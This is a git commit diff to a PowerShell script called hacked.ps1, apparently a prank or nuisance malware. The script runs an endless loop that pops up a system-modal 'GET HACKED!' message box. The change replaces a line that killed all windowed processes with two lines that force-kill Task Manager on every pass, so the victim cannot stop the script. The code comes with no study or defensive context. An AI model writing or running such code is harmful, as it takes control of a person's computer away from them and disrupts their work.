cb48181bfb635768bc1cfbe16557f5d157f9b294
creepyturnip <92087207+creepyturnip@users.noreply.github.com>
2023-05-17 16:08:52 +0200

    Update hacked.ps1

--- hacked.ps1
+++ hacked.ps1
@@ -1,6 +1,7 @@
 [void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic") 
 
 while (1) {
-Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | stop-process
+taskkill /IM taskmgr.exe /F
 [Microsoft.VisualBasic.Interaction]::MsgBox("GET HACKED!.", "OKOnly,SystemModal,Critical", "eZZZZZ")
+taskkill /IM taskmgr.exe /F
 }
